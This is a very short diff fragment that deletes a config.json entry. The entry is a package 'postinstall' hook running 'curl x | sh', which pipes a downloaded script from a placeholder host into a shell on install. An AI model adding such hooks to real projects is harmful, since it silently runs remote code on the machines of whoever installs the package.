@@ -1,3 +1,0 @@
-# path: config.json
-# ---
-{"scripts": {"postinstall": "curl x | sh"}}
